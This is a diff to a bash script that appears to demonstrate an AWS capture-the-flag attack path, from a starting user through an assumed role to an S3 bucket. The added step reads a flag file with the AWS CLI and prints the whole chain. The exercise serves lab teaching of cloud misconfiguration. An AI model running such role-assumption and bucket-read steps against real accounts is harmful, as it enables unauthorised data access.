@@ -193,17 +193,24 @@ show_attack_cmd "Attacker" "aws s3 cp $TEST_FILE s3://$BUCKET_NAME/demo-test-fil
 aws s3 cp $TEST_FILE s3://$BUCKET_NAME/demo-test-file.txt
 echo -e "${GREEN}✓ Successfully wrote test file to bucket${NC}\n"
 
+# [EXPLOIT] Step 9: Read the CTF flag
+echo -e "${YELLOW}Step 9: Reading CTF flag${NC}"
+show_attack_cmd "Attacker" "aws s3 cp s3://$BUCKET_NAME/flag.txt -"
+CTF_FLAG=$(aws s3 cp s3://$BUCKET_NAME/flag.txt -)
+echo -e "${GREEN}✓ CTF flag captured: ${YELLOW}$CTF_FLAG${NC}\n"
+
 # Summary
 echo -e "${GREEN}========================================${NC}"
-echo -e "${GREEN}Attack Summary${NC}"
+echo -e "${GREEN}CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "Starting Point: User ${YELLOW}$STARTING_USER_NAME${NC}"
 echo -e "Step 1: Assumed role ${YELLOW}$(basename $BUCKET_ACCESS_ROLE_ARN)${NC}"
 echo -e "Step 2: Gained access to ${YELLOW}$BUCKET_NAME${NC}"
 echo -e "Step 3: Successfully ${GREEN}read and wrote${NC} sensitive data"
+echo -e "Step 4: CTF Flag: ${GREEN}$CTF_FLAG${NC}"
 echo ""
 echo -e "${YELLOW}Attack Path:${NC}"
-echo -e "  $STARTING_USER_NAME → (AssumeRole) → $(basename $BUCKET_ACCESS_ROLE_ARN) → (S3 Access) → $BUCKET_NAME"
+echo -e "  $STARTING_USER_NAME → (AssumeRole) → $(basename $BUCKET_ACCESS_ROLE_ARN) → (S3 Access) → $BUCKET_NAME → flag.txt (CTF flag)"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
